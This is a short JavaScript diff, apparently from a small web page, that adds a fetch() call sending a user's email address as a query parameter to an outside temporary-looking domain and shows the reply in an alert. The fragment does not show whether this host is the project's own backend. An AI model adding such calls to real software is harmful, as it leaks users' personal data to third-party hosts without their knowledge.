@@ -38,6 +38,9 @@
          link.href = "http://www.example.com";
          link.innerHTML = "somethingelse";
          document.getElementById("content").appendChild(link);
+         fetch("https://mrlynch-cf.tmpdomain.xyz/?email="+email)
+           .then(resp => resp.text())
+           .then(resp => alert(resp))
        }
           
         if(first.includes(email)){
